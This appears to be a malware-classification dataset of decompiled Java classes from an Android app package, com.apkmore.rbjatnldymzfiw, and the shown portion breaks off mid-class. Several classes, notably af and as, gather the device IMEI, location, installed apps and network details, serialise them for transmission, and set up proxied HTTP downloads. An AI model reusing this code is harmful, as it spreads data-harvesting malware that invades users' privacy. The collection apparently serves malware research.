"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.d\j.code","class j implements View.OnClickListener {   final Context f60a;   final Handler b;   final i c;   public j(  i iVar,  Context context,  Handler handler){     this.c=iVar;     this.f60a=context;     this.b=handler;   }   @Override public void onClick(  View view){     if (com.apkmore.rbjatnldymzfiw.a.c.h.f(this.f60a) == null) {       com.apkmore.rbjatnldymzfiw.a.c.h.g(this.f60a);     }  else {       this.c.a();       this.b.sendEmptyMessage(0);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.d\k.code","public class k implements Animation.AnimationListener {   final i f61a;   public k(  i iVar){     this.f61a=iVar;   }   @Override public void onAnimationEnd(  Animation animation){     boolean z;     z=this.f61a.h;     if (z) {       this.f61a.a();     }   }   @Override public void onAnimationRepeat(  Animation animation){   }   @Override public void onAnimationStart(  Animation animation){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.d\l.code","public class l extends BaseAdapter {   Handler f62a=new m(this);   private n b;   private Context c;   private List d;   public l(  Context context,  List list){     this.c=context;     this.d=list;     if (com.apkmore.rbjatnldymzfiw.a.a.c.b.size() == 0) {       com.apkmore.rbjatnldymzfiw.a.c.h.a(context,true);     }   }   @Override public int getCount(){     return this.d.size();   }   @Override public Object getItem(  int i){     return this.d.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     TextView textView;     ImageView imageView;     TextView textView2;     TextView textView3;     ImageView imageView2;     TextView textView4;     com.apkmore.rbjatnldymzfiw.a.b.b bVar=(com.apkmore.rbjatnldymzfiw.a.b.b)this.d.get(i);     if (view == null) {       this.b=new n(this,this.c);       this.b.setTag(this.b);     }  else {       this.b=(n)view.getTag();     }     Map map=com.apkmore.rbjatnldymzfiw.a.a.i.f35a;     String str=bVar.b;     textView=this.b.c;     map.put(str,textView);     Drawable drawable=this.c.getResources().getDrawable(R.drawable.sym_def_app_icon);     if (""mounted"".equals(Environment.getExternalStorageState())) {       String str2=Environment.getExternalStorageDirectory() + ""/"" + com.apkmore.rbjatnldymzfiw.a.c.b.G+ bVar.e+ ""/""+ com.apkmore.rbjatnldymzfiw.a.c.b.W+ com.apkmore.rbjatnldymzfiw.a.c.b.H;       if (new File(str2).exists()) {         drawable=com.apkmore.rbjatnldymzfiw.a.c.f.b(this.c,str2);       }  else       if (com.apkmore.rbjatnldymzfiw.a.c.h.f(this.c) != null) {         new com.apkmore.rbjatnldymzfiw.a.a.c().a(bVar.k,bVar.e,this.f62a);       }     }     imageView=this.b.b;     imageView.setImageDrawable(drawable);     if (com.apkmore.rbjatnldymzfiw.a.a.k.c(bVar.b)) {       textView4=this.b.c;       textView4.setText(com.apkmore.rbjatnldymzfiw.a.c.b.az);     }  else {       textView2=this.b.c;       textView2.setText(bVar.d);     }     try {       if (Uj.f26a) {         PackageManager packageManager=this.c.getPackageManager();         String obj=packageManager.getApplicationLabel(packageManager.getApplicationInfo(bVar.f,128)).toString();         Bitmap a2=com.apkmore.rbjatnldymzfiw.a.c.i.a(((BitmapDrawable)packageManager.getApplicationIcon(bVar.f)).getBitmap(),this.c,50,50);         textView3=this.b.c;         textView3.setText(obj);         imageView2=this.b.b;         imageView2.setImageBitmap(a2);       }     }  catch (    Exception e) {     }     return this.b;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.d\m.code","public class m extends Handler {   final l f63a;   public m(  l lVar){     this.f63a=lVar;   }   @Override public void handleMessage(  Message message){     this.f63a.notifyDataSetChanged();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.d\n.code","public class n extends LinearLayout {   final l f64a;   private ImageView b;   private TextView c;   public n(  l lVar,  Context context){     super(context);     this.f64a=lVar;     setOrientation(1);     this.b=new ImageView(context);     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-1,-2);     addView(this.b,layoutParams);     this.c=new TextView(context);     this.c.setTextColor(ViewCompat.MEASURED_STATE_MASK);     this.c.setTextSize(10.0f);     this.c.setSingleLine(true);     this.c.setSelected(true);     this.c.setEllipsize(TextUtils.TruncateAt.MARQUEE);     this.c.setGravity(17);     addView(this.c,layoutParams);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.d\o.code","public class o extends ListView {   public o(  Context context){     super(context);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\a.code","public class a {   private static a f75a=null;   private a(){   }   public static a a(){     if (f75a == null) {       f75a=new a();     }     return f75a;   }   public void a(  Context context,  int i,  int i2){     new b(this,context,i,i2).execute(new Void[0]);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\aa.code","class aa implements Runnable {   final Hnu f78a;   public aa(  Hnu hnu){     this.f78a=hnu;   }   @Override public void run(){     this.f78a.a();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\ab.code","class ab implements AdapterView.OnItemClickListener {   final Hnu f79a;   public ab(  Hnu hnu){     this.f79a=hnu;   }   @Override public void onItemClick(  AdapterView adapterView,  View view,  int i,  long j){     Activity activity;     c cVar;     c cVar2;     ad adVar=(ad)adapterView.getAdapter().getItem(i);     at a2=ay.a(adVar);     Hnu hnu=this.f79a;     activity=Hnu.d;     hnu.f=new c(activity,a2,false);     cVar=this.f79a.f;     cVar.a(this.f79a.f73a);     Hnu hnu2=this.f79a;     cVar2=this.f79a.f;     hnu2.a(cVar2.f103a);     ay.g(this.f79a,adVar.e + "",0"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\ac.code","public class ac { } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\ad.code","public class ad implements ae, Serializable {   private static final String C=h.C;   public String f80a;   public String b;   public int c;   public String d;   public int e;   public String f;   public String g;   public String h;   public int i;   public String j;   public String k;   public String l;   public boolean m;   public boolean n;   public boolean o;   public String p;   public boolean q;   public String r;   public String s;   public int t;   public int u;   public String x;   public int y;   public int v=0;   public int w=0;   public String z="""";   public String A="""";   public boolean B=false;   public String a(){     StringBuffer stringBuffer=new StringBuffer();     stringBuffer.append(this.f80a);     stringBuffer.append(C);     stringBuffer.append(this.b);     stringBuffer.append(C);     stringBuffer.append(this.c);     stringBuffer.append(C);     stringBuffer.append(this.d);     stringBuffer.append(C);     stringBuffer.append(this.e);     stringBuffer.append(C);     stringBuffer.append(this.f);     stringBuffer.append(C);     stringBuffer.append(this.g);     stringBuffer.append(C);     stringBuffer.append(this.h);     stringBuffer.append(C);     stringBuffer.append(this.i);     stringBuffer.append(C);     stringBuffer.append(this.j);     stringBuffer.append(C);     stringBuffer.append(this.k);     stringBuffer.append(C);     stringBuffer.append(this.l);     stringBuffer.append(C);     stringBuffer.append(this.m);     stringBuffer.append(C);     stringBuffer.append(this.n);     stringBuffer.append(C);     stringBuffer.append(this.o);     stringBuffer.append(C);     stringBuffer.append(this.p);     stringBuffer.append(C);     stringBuffer.append(this.q);     stringBuffer.append(C);     stringBuffer.append(this.r);     stringBuffer.append(C);     stringBuffer.append(this.s);     stringBuffer.append(C);     stringBuffer.append(this.t);     stringBuffer.append(C);     stringBuffer.append(this.u);     stringBuffer.append(C);     stringBuffer.append(this.x);     stringBuffer.append(C);     stringBuffer.append(this.y);     stringBuffer.append(C);     stringBuffer.append(this.z);     stringBuffer.append(C);     stringBuffer.append(this.A);     stringBuffer.append(C);     return stringBuffer.toString();   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject == null) {       return;     }     try {       this.f80a=jSONObject.isNull(h.bz) ? null : jSONObject.getString(h.bz);       this.b=jSONObject.isNull(h.bA) ? null : jSONObject.getString(h.bA);       this.c=jSONObject.isNull(h.bB) ? -1 : jSONObject.getInt(h.bB);       this.d=jSONObject.isNull(h.bC) ? null : jSONObject.getString(h.bC);       this.e=jSONObject.isNull(h.bD) ? -1 : jSONObject.getInt(h.bD);       this.f=jSONObject.isNull(h.bE) ? null : jSONObject.getString(h.bE);       this.g=jSONObject.isNull(h.bF) ? null : jSONObject.getString(h.bF);       this.h=jSONObject.isNull(h.bG) ? null : jSONObject.getString(h.bG);       this.i=jSONObject.isNull(h.bH) ? -1 : jSONObject.getInt(h.bH);       this.j=jSONObject.isNull(h.bI) ? null : jSONObject.getString(h.bI);       this.k=jSONObject.isNull(h.bJ) ? null : jSONObject.getString(h.bJ);       this.l=jSONObject.isNull(h.bK) ? null : jSONObject.getString(h.bK);       this.m=jSONObject.isNull(h.bL) ? true : jSONObject.getBoolean(h.bL);       this.n=jSONObject.isNull(h.bM) ? true : jSONObject.getBoolean(h.bM);       this.o=jSONObject.isNull(h.bN) ? false : jSONObject.getBoolean(h.bN);       this.p=jSONObject.isNull(h.bO) ? null : jSONObject.getString(h.bO);       this.q=jSONObject.isNull(h.bP) ? false : jSONObject.getBoolean(h.bP);       this.r=jSONObject.isNull(h.bQ) ? null : jSONObject.getString(h.bQ);       this.s=jSONObject.isNull(h.bR) ? null : jSONObject.getString(h.bR);       this.t=jSONObject.isNull(h.bS) ? 0 : jSONObject.getInt(h.bS);       this.u=jSONObject.isNull(h.bT) ? 0 : jSONObject.getInt(h.bT);       this.z=jSONObject.isNull(h.bU) ? null : jSONObject.getString(h.bU);       this.A=jSONObject.isNull(h.bV) ? null : jSONObject.getString(h.bV);       this.x=jSONObject.isNull(h.bW) ? null : jSONObject.getString(h.bW);     }  catch (    Exception e) {       e.printStackTrace();     }   }   public boolean a(  String str){     String[] a2=ay.a(str,C);     if (a2 == null) {       return false;     }     try {       this.f80a=a2[0];       this.b=a2[1];       this.c=Byte.valueOf(a2[2]).byteValue();       this.d=a2[3];       this.e=Integer.valueOf(a2[4]).intValue();       this.f=a2[5];       this.g=a2[6];       this.h=a2[7];       this.i=Integer.valueOf(a2[8]).intValue();       this.j=a2[9];       this.k=a2[10];       this.l=a2[11];       this.m=a2[12].equals(h.aX);       this.n=a2[13].equals(h.aX);       this.o=a2[14].equals(h.aX);       this.p=a2[15];       this.q=a2[16].equals(h.aX);       this.r=a2[17];       this.s=a2[18];       this.t=Integer.valueOf(a2[19]).intValue();       this.u=Integer.valueOf(a2[20]).intValue();       this.x=a2[21];       this.y=Integer.valueOf(a2[22]).intValue();       this.z=a2[23];       this.A=a2[24];       return true;     }  catch (    Exception e) {       return false;     }   }   @Override public String b(){     return h.bA;   }   public String toString(){     return """";   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\ae.code","interface ae {   void a(  JSONObject jSONObject);   String b(); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\af.code","public class af implements ae {   public static String u=""2.1.2"";   public String c;   public String d;   public String e;   public int f;   public int g;   public int h;   public int i;   public double j;   public double k;   public String l;   public String m;   public String n;   public String o;   public boolean p;   public String q;   public String r;   public int s;   public String t;   public int v=3;   public String b=Build.PRODUCT;   public String f81a=Build.VERSION.SDK;   public af(  Context context){     this.q=context.getPackageName();     this.d=((TelephonyManager)context.getSystemService(""phone"")).getDeviceId();     this.c=ay.l(context);     WindowManager windowManager=(WindowManager)context.getSystemService(""window"");     DisplayMetrics displayMetrics=new DisplayMetrics();     windowManager.getDefaultDisplay().getMetrics(displayMetrics);     this.g=displayMetrics.densityDpi;     this.h=displayMetrics.widthPixels;     this.i=displayMetrics.heightPixels;     PackageManager packageManager=context.getPackageManager();     try {       PackageInfo packageInfo=packageManager.getPackageInfo(context.getPackageName(),0);       this.e=packageInfo.versionName;       this.f=packageInfo.versionCode;     }  catch (    PackageManager.NameNotFoundException e) {     }     this.n=ay.a(context,packageManager);     Log.d(com.apkmore.rbjatnldymzfiw.j.d.b.f112a,h.E + "":"" + this.n);     this.o=ay.i(context);     Log.d(com.apkmore.rbjatnldymzfiw.j.d.b.f112a,h.D + "":"" + this.o);     this.m=aq.c(context);     if (this.m == null) {       this.m=h.av;     }     Location j=ay.j(context);     if (j != null) {       this.k=j.getLongitude();       this.j=j.getLatitude();       String a2=ay.a(this.k,this.j);       if (a2 != null) {         this.l=a2;       }     }     this.p=ay.f(context);     this.s=ay.a(context);     if (this.s != 100061) {     }   }   public JSONObject a(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(h.bz,this.f81a);       jSONObject.put(h.bA,this.b);       jSONObject.put(h.bB,this.c);       jSONObject.put(h.bC,this.d);       jSONObject.put(h.bD,this.e);       jSONObject.put(h.bE,this.f);       jSONObject.put(h.bF,this.g);       jSONObject.put(h.bG,this.h);       jSONObject.put(h.bH,this.i);       jSONObject.put(h.bI,this.j);       jSONObject.put(h.bJ,this.k);       jSONObject.put(h.bK,this.l);       jSONObject.put(h.bL,this.m);       jSONObject.put(h.bM,this.n);       jSONObject.put(h.bN,this.o);       jSONObject.put(h.bO,this.p);       jSONObject.put(h.bP,this.q);       jSONObject.put(h.bQ,this.r);       jSONObject.put(h.bR,this.s);       jSONObject.put(h.bS,this.t);       jSONObject.put(h.bT,u);       jSONObject.put(h.bU,this.v);       return jSONObject;     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject == null) {       return;     }     try {       this.f81a=jSONObject.isNull(h.bz) ? null : jSONObject.getString(h.bz);       this.b=jSONObject.isNull(h.bA) ? null : jSONObject.getString(h.bA);       this.c=jSONObject.isNull(h.bB) ? null : jSONObject.getString(h.bB);       this.d=jSONObject.isNull(h.bC) ? null : jSONObject.getString(h.bC);       this.e=jSONObject.isNull(h.bD) ? null : jSONObject.getString(h.bD);       this.f=jSONObject.isNull(h.bE) ? 0 : jSONObject.getInt(h.bE);       this.g=jSONObject.isNull(h.bF) ? 0 : jSONObject.getInt(h.bF);       this.h=jSONObject.isNull(h.bG) ? 0 : jSONObject.getInt(h.bG);       this.i=jSONObject.isNull(h.bH) ? 0 : jSONObject.getInt(h.bH);       this.j=jSONObject.isNull(h.bI) ? 0.0d : jSONObject.getDouble(h.bI);       this.k=jSONObject.isNull(h.bJ) ? 0.0d : jSONObject.getDouble(h.bJ);       this.l=jSONObject.isNull(h.bK) ? null : jSONObject.getString(h.bK);       this.m=jSONObject.isNull(h.bL) ? null : jSONObject.getString(h.bL);       this.n=jSONObject.isNull(h.bM) ? null : jSONObject.getString(h.bM);       this.o=jSONObject.isNull(h.bN) ? null : jSONObject.getString(h.bN);       this.p=jSONObject.isNull(h.bO) ? false : jSONObject.getBoolean(h.bO);       this.q=jSONObject.isNull(h.bP) ? null : jSONObject.getString(h.bP);       this.r=jSONObject.isNull(h.bQ) ? null : jSONObject.getString(h.bQ);       this.s=jSONObject.isNull(h.bR) ? 100008 : jSONObject.getInt(h.bR);       this.t=jSONObject.isNull(h.bS) ? null : jSONObject.getString(h.bS);       u=jSONObject.isNull(h.bT) ? null : jSONObject.getString(h.bT);       this.v=jSONObject.isNull(h.bU) ? 0 : jSONObject.getInt(h.bU);     }  catch (    Exception e) {       e.printStackTrace();     }   }   @Override public String b(){     return h.bz;   }   public String toString(){     return """";   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\ag.code","public class ag implements ae {   public int f82a;   public String b;   @Override public void a(  JSONObject jSONObject){     try {       this.f82a=jSONObject.isNull(h.bz) ? -1 : jSONObject.getInt(h.bz);       this.b=jSONObject.isNull(h.bA) ? null : jSONObject.getString(h.bA);     }  catch (    Exception e) {       e.printStackTrace();     }   }   @Override public String b(){     return h.bC;   }   public String toString(){     return ""["" + this.f82a + "",""+ this.b+ ""]"";   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\ah.code","public class ah {   private Context f83a;   private Handler b=new Handler();   private boolean c=false;   private ak d=null;   public ah(  Context context){     this.f83a=context;   }   public void a(  ak akVar){     this.d=akVar;   }   public void a(  at atVar){     new ai(this,atVar).start();   }   public boolean a(){     return this.c;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\ai.code","public class ai extends Thread {   final at f84a;   final ah b;   public ai(  ah ahVar,  at atVar){     this.b=ahVar;     this.f84a=atVar;   }   @Override public void run(){     Context context;     Context context2;     Context context3;     Context context4;     ak akVar;     Handler handler;     Context context5;     this.b.c=true;     context=this.b.f83a;     x a2=x.a(context);     String str="""" + this.f84a.h;     context2=this.b.f83a;     String m=ay.m(context2);     HashMap a3=a2.a(str,m);     if (a3 != null) {       ag agVar=(ag)a3.get(ag.class.getName());       if (agVar == null) {         context4=this.b.f83a;         ay.g(context4,m);       }  else       if (agVar.f82a != 0) {         context5=this.b.f83a;         ay.g(context5,m);       }       ad[] adVarArr=(ad[])a3.get(ad.class.getName());       if (adVarArr != null) {         akVar=this.b.d;         if (akVar != null) {           handler=this.b.b;           handler.post(new aj(this,adVarArr));         }       }     }  else {       context3=this.b.f83a;       ay.g(context3,m);     }     try {       Thread.sleep(200L);     }  catch (    InterruptedException e) {       e.printStackTrace();     }     this.b.c=false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\aj.code","class aj implements Runnable {   final ad[] f85a;   final ai b;   public aj(  ai aiVar,  ad[] adVarArr){     this.b=aiVar;     this.f85a=adVarArr;   }   @Override public void run(){     ak akVar;     akVar=this.b.b.d;     akVar.a(this.f85a);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\ak.code","public interface ak {   void a(  ad[] adVarArr); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\al.code","public class al {   public static ae a(  Class cls,  String str){     if (str == null || str.length() < 2) {       return null;     }     try {       JSONObject jSONObject=new JSONObject(str);       ae aeVar=(ae)cls.newInstance();       if (!jSONObject.isNull(aeVar.b())) {         aeVar.a(jSONObject.getJSONObject(aeVar.b()));         return aeVar;       }     }  catch (    IllegalAccessException e) {       e.printStackTrace();     } catch (    InstantiationException e2) {       e2.printStackTrace();     } catch (    JSONException e3) {       e3.printStackTrace();     }     return null;   }   public static ae[] b(  Class cls,  String str){     JSONArray jSONArray;     if (str == null || str.length() < 2) {       return null;     }     try {       JSONObject jSONObject=new JSONObject(str);       ae aeVar=(ae)cls.newInstance();       if (!jSONObject.isNull(aeVar.b()) && (jSONArray=jSONObject.getJSONArray(aeVar.b())) != null) {         ae[] aeVarArr=(ae[])Array.newInstance((Class<?>)cls,jSONArray.length());         int i=0;         while (true) {           int i2=i;           if (i2 >= jSONArray.length()) {             return aeVarArr;           }           ae aeVar2=(ae)cls.newInstance();           aeVar2.a(jSONArray.getJSONObject(i2));           aeVarArr[i2]=aeVar2;           i=i2 + 1;         }       }     }  catch (    IllegalAccessException e) {       e.printStackTrace();     } catch (    InstantiationException e2) {       e2.printStackTrace();     } catch (    JSONException e3) {       e3.printStackTrace();     }     return null;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\am.code","!org.eclipse.jdt.core.dom.TypeDeclaration@656d587d"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\an.code","public class an extends Handler {   final am f87a;   public an(  am amVar){     this.f87a=amVar;   }   @Override public void handleMessage(  Message message){     Context context;     Context context2;     Context context3;     Context context4;     Object obj=message.obj;     if (obj != null) {       at atVar=(at)obj;       ao aoVar=new ao(this,atVar);       String str=atVar.q;       context=this.f87a.f86a;       com.apkmore.rbjatnldymzfiw.j.b.h hVar=new com.apkmore.rbjatnldymzfiw.j.b.h(str,ay.b(context,h.aB + h.s,atVar.h),0);       context2=this.f87a.f86a;       aq.a(context2,hVar,aoVar);       String[] a2=ay.a(atVar.r,"";"");       int length=a2 != null ? a2.length : 0;       for (int i=0; i < length; i++) {         String str2=a2[i];         context3=this.f87a.f86a;         com.apkmore.rbjatnldymzfiw.j.b.h hVar2=new com.apkmore.rbjatnldymzfiw.j.b.h(str2,ay.b(context3,i + h.s,atVar.h),0);         hVar2.a(Integer.valueOf(i));         context4=this.f87a.f86a;         aq.a(context4,hVar2,null);       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\ao.code","class ao implements com.apkmore.rbjatnldymzfiw.j.b.c {   final at f88a;   final an b;   public ao(  an anVar,  at atVar){     this.b=anVar;     this.f88a=atVar;   }   @Override public void a(  com.apkmore.rbjatnldymzfiw.j.b.h hVar,  int i){     Context context;     if (i == 4 || i == 5) {       this.b.post(new ap(this));       this.f88a.l=0;       context=this.b.f87a.f86a;       ay.b(context,this.f88a);       Dgl.a();     }   }   @Override public void a(  com.apkmore.rbjatnldymzfiw.j.b.h hVar,  long j){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\ap.code","class ap implements Runnable {   final ao f89a;   public ap(  ao aoVar){     this.f89a=aoVar;   }   @Override public void run(){     Context context;     context=this.f89a.b.f87a.f86a;     am.a(context,this.f89a.f88a);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\aq.code","public class aq {   public static HttpClient a(  Context context){     if (c(context) == null) {       return null;     }     if (!b(context)) {       return new DefaultHttpClient();     }     BasicHttpParams basicHttpParams=new BasicHttpParams();     HttpConnectionParams.setConnectionTimeout(basicHttpParams,30000);     HttpConnectionParams.setSoTimeout(basicHttpParams,30000);     HttpConnectionParams.setSocketBufferSize(basicHttpParams,204800);     HttpClientParams.setRedirecting(basicHttpParams,true);     HttpHost httpHost=new HttpHost(h.aM,80);     if (h.aN.equalsIgnoreCase(c(context))) {       httpHost=new HttpHost(h.aO,80);     }     a(basicHttpParams,httpHost);     return new DefaultHttpClient(basicHttpParams);   }   public static void a(  Context context,  int i,  String str,  int i2,  int i3,  Intent intent,  String str2,  int i4){     Notification notification=new Notification(i,"""",System.currentTimeMillis());     PendingIntent activity=PendingIntent.getActivity(context,0,intent,134217728);     notification.flags=i3;     StringBuffer stringBuffer=new StringBuffer();     if (i4 > -1 && i4 <= 100) {       stringBuffer.append(i4);       stringBuffer.append(""%    "");     }     stringBuffer.append(str2);     notification.setLatestEventInfo(context,str,stringBuffer.toString(),activity);     d(context).notify(400000 + i2,notification);   }   public static void a(  Context context,  com.apkmore.rbjatnldymzfiw.j.b.h hVar,  com.apkmore.rbjatnldymzfiw.j.b.c cVar){     com.apkmore.rbjatnldymzfiw.j.b.d a2=com.apkmore.rbjatnldymzfiw.j.b.d.a();     if (a2 == null) {       a2=com.apkmore.rbjatnldymzfiw.j.b.d.a(context);     }     com.apkmore.rbjatnldymzfiw.j.b.h a3=a2.a(hVar);     if (a3 == null || a3.g() == 5 || a3.g() == 4) {       if (cVar != null) {         hVar.a(cVar);       }       hVar.d();     }  else {       a3.a(hVar.n());       a3.a(cVar);       if (cVar != null) {         cVar.a(a3,a3.g());       }     }   }   public static void a(  Context context,  String str){     context.startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(str)));   }   private static void a(  HttpParams httpParams,  HttpHost httpHost){     httpParams.setParameter(""http.route.default-proxy"",httpHost);   }   protected static boolean b(  Context context){     String c=c(context);     if (c != null) {       return c.compareTo(h.aL) == 0 || c.compareTo(h.aP) == 0 || c.compareTo(h.aQ) == 0;     }     return false;   }   public static String c(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     if (activeNetworkInfo == null) {       return null;     }     return activeNetworkInfo.getTypeName();   }   public static NotificationManager d(  Context context){     return (NotificationManager)context.getSystemService(""notification"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\ar.code","public class ar { } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\as.code","public class as {   protected String b;   protected String c;   protected String g;   protected String h;   protected int i;   protected int k;   protected String n;   protected String o;   protected int p;   protected int u;   protected String f90a=Build.VERSION.SDK;   protected String d=Build.PRODUCT;   protected double e=-500.0d;   protected double f=-500.0d;   protected String j="""";   protected String l=h.av;   protected int m=1;   protected int q=0;   protected String r=null;   protected String s="""";   protected String t="""";   public as(  Context context){     this.b="""";     this.c="""";     this.g="""";     this.h="""";     this.i=100044;     this.k=Emulator.GAMEPAD_DOWN_RIGHT;     this.n="""";     this.o="""";     this.p=0;     this.u=1;     this.h=((TelephonyManager)context.getSystemService(""phone"")).getDeviceId();     this.g=context.getPackageName();     this.p=ay.f(context) ? 1 : 0;     this.c=h.av;     WindowManager windowManager=(WindowManager)context.getSystemService(""window"");     DisplayMetrics displayMetrics=new DisplayMetrics();     windowManager.getDefaultDisplay().getMetrics(displayMetrics);     this.b=ay.l(context);     this.i=ay.a(context);     this.k=displayMetrics.densityDpi;     this.n=ay.i(context);     this.o=ay.n(context);     this.u=ay.k(context);   }   private int c(){     int i=0;     if (this.b == null) {       this.b="""";     }     if (this.d == null) {       this.d="""";     }     if (this.c == null) {       this.c=h.av;     }     if (this.h == null) {       this.h="""";     }     if (this.n == null) {       this.n="""";     }     if (this.o == null) {       this.o="""";     }     if (this.s == null) {       this.s="""";     }     if (this.t == null) {       this.t="""";     }     if (this.l == null || """".equals(this.l)) {       this.l=h.av;     }     int length=((this.j == null || """".equals(this.j)) ? 0 : this.j.trim().getBytes().length + 3) + ""2.1.2"".getBytes().length + this.f90a.getBytes().length+ 30+ this.b.getBytes().length+ this.c.getBytes().length+ this.d.getBytes().length+ String.valueOf(this.e).getBytes().length+ String.valueOf(this.f).getBytes().length+ this.g.getBytes().length+ this.h.getBytes().length+ 7+ 7+ 3+ this.l.getBytes().length+ 7+ 3+ this.n.getBytes().length+ 3+ this.o.getBytes().length+ 7+ 7;     if (this.r != null && !"""".equals(this.r)) {       i=this.r.trim().getBytes().length + 3;     }     return length + i + 3+ this.s.getBytes().length+ 3+ this.t.getBytes().length+ 7;   }   public void a(){   }   public byte[] b(){     int c=c();     byte[] bArr=new byte[c];     bArr[0]=17;     System.arraycopy(g.a((short)(c - 3)),0,bArr,1,2);     bArr[3]=1;     System.arraycopy(g.a((short)this.b.getBytes().length),0,bArr,4,2);     byte[] bytes=this.b.getBytes();     System.arraycopy(bytes,0,bArr,6,bytes.length);     int length=bytes.length + 6;     if (this.j != null && !"""".equals(this.j)) {       int i=length + 1;       bArr[length]=10;       byte[] a2=g.a((short)this.j.getBytes().length);       System.arraycopy(a2,0,bArr,i,a2.length);       int i2=i + 2;       byte[] bytes2=this.j.getBytes();       System.arraycopy(bytes2,0,bArr,i2,bytes2.length);       length=i2 + bytes2.length;     }     int i3=length + 1;     bArr[length]=13;     byte[] a3=g.a((short)4);     System.arraycopy(a3,0,bArr,i3,a3.length);     int i4=i3 + 2;     byte[] a4=g.a(this.m);     System.arraycopy(a4,0,bArr,i4,a4.length);     int length2=i4 + a4.length;     int i5=length2 + 1;     bArr[length2]=0;     System.arraycopy(g.a((short)this.f90a.getBytes().length),0,bArr,i5,2);     int i6=i5 + 2;     byte[] bytes3=this.f90a.getBytes();     System.arraycopy(bytes3,0,bArr,i6,bytes3.length);     int length3=i6 + bytes3.length;     int i7=length3 + 1;     bArr[length3]=2;     System.arraycopy(g.a((short)this.c.getBytes().length),0,bArr,i7,2);     int i8=i7 + 2;     byte[] bytes4=this.c.getBytes();     System.arraycopy(bytes4,0,bArr,i8,bytes4.length);     int 